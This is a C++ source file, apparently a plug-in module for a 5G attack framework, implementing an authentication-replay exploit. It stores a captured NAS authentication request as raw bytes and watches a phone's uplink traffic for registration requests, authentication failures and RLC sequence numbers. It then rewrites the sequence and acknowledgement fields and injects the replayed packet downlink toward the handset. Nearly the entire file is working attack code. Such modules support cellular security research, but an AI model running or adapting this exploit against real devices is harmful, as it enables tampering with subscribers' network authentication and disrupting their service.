#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

const uint8_t authentication_request[] = {
    0x01, 0x03, 0x00, 0x01,
    0x00, // ACK 1
    0x01, 0x35, 0xc0, 0x00, 0x00, 0x00, 0x28, 0x85, 0x4f, 0xc0, 0x0a, 0xc0, 0x40, 0x40, 0x00, 0x04, 0x3d, 0xc1,
    0x57, 0x7d, 0x4a, 0x4d, 0x34, 0x46, 0x45, 0xeb, 0x7d, 0x98, 0x37, 0x0d, 0x0f, 0xce, 0xa4, 0x02, 0x01, 0x1d,
    0x2d, 0xec, 0xf4, 0x2a, 0x50, 0x00, 0x0e, 0xbd, 0xd6, 0x26, 0xd9, 0xc6, 0x7d, 0xe3, 0x20, 0x00, 0x00, 0x00,
    0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

class AuthenticationReplayExploit : public Exploit
{
public:
  AuthenticationReplayExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                              SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    auth_req.reset(
        new std::vector<uint8_t>(authentication_request, authentication_request + sizeof(authentication_request)));
  }

  void setup() override
  {
    f_registration_request = ws_filter_t::make_filter("nas-5gs.mm.message_type == 0x41");
    filters.push_back(f_registration_request);

    f_authentication_failure = ws_filter_t::make_filter("nas-5gs.mm.message_type == 0x59");
    filters.push_back(f_authentication_failure);

    f_rrc_setup_request = ws_filter_t::make_filter("nr-rrc.c1 == 0");
    filters.push_back(f_rrc_setup_request);

    f_ack_sn = ws_field_t::make_field_uint32("rlc-nr.am.ack-sn");
    fields.push_back(f_ack_sn);

    f_sn = ws_field_t::make_field_uint32("rlc-nr.am.sn");
    fields.push_back(f_sn);

    f_nack_sn = ws_field_t::make_field_uint32("rlc-nr.am.nack-sn");
    fields.push_back(f_nack_sn);
  }

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    bool sn_found = false;
    if (direction == UL) {
      // If ACK SN from UE received, then update the sequence number to new sequence number
      if (f_ack_sn->has_uint32) {
        uint32_t ack_sn_recv = f_ack_sn->uint32_value;
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
          logger.info(YELLOW "Update sequence number to %u" RESET, dl_sn);
        }
      }

      // If UL message received from the base station, then we have to send the ACK back to UE
      if (f_sn->has_uint32) {
        uint32_t sn_recv = f_sn->uint32_value;
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv + 1;
          sn_found  = true;
          logger.info(YELLOW "Update ACK sequence number to %u" RESET, dl_sn);
        }
        if (sn_recv == 0) {
          logger.info(YELLOW "Received registration request" RESET);
          replay_authentication_request(logger);
          return;
        }
      }

      if (f_nack_sn->has_uint32) {
        uint32_t nack_sn_recv = f_nack_sn->uint32_value;
        dl_sn                 = nack_sn_recv;
        logger.info(YELLOW "Update sequence number to NACK %u" RESET, dl_sn);
        replay_authentication_request(logger);
      }
    }

    if (f_rrc_setup_request->match) {
      // Reset the sequence number when RRC setup request received, as this indicates the UE has reconnected to the base
      // station
      dl_sn     = 0;
      dl_ack_sn = 1;
    }

    if (f_registration_request->match) {
      logger.info(YELLOW "Received registration request" RESET);
      replay_authentication_request(logger);
      return;
    }

    if (f_authentication_failure->match) {
      logger.info(YELLOW "Received authentication failure" RESET);
      if (!sn_found) {
        dl_ack_sn += 1;
      }
      replay_authentication_request(logger);
      return;
    }
  }

private:
  void replay_authentication_request(srslog::basic_logger& logger)
  {
    if (auth_req->empty()) {
      return;
    }
    // auth_req->data()[3] = dl_sn & 0xff;
    // auth_req->data()[5] = dl_sn & 0xff;

    auth_req->data()[3]  = dl_ack_sn & 0xff;
    auth_req->data()[8]  = dl_sn & 0xff;
    auth_req->data()[10] = dl_sn & 0xff;
    dl_buffer_queue.push(auth_req);
    logger.info(YELLOW "Replay authentication request" RESET);
  }

  std::shared_ptr<ws_filter_t> f_registration_request;
  std::shared_ptr<ws_filter_t> f_authentication_failure;
  std::shared_ptr<ws_filter_t> f_rrc_setup_request;
  std::shared_ptr<ws_field_t>  f_ack_sn;
  std::shared_ptr<ws_field_t>  f_sn;
  std::shared_ptr<ws_field_t>  f_nack_sn;

  uint32_t dl_sn     = 0;
  uint32_t dl_ack_sn = 2;

  std::shared_ptr<std::vector<uint8_t> > auth_req;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new AuthenticationReplayExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}